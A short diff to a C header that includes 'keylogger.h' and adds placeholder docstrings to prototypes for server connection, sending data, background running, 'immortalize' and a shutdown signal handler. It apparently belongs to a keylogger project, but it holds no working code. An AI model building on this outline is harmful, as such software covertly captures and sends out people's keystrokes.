@@ -3,6 +3,8 @@
 #include <netinet/in.h>  // sockaddr_in
 #include <stdio.h>       // FILE
 
+#include "keylogger.h"
+
 /**
  * Attempt to connect to a server on a given socket.
  *
@@ -50,6 +52,17 @@ int send_data(FILE* socket_file);
 
 void background_process(void);
 
+/**
+ * Add docstring here
+ */
+void background_process(void);
+
+/**
+ * Add docstring here
+ */
 void immortalize(void);
 
-void shutdown_signal(int signal);
+/**
+ * Add docstring here
+ */
+void shutdown_signal(int);
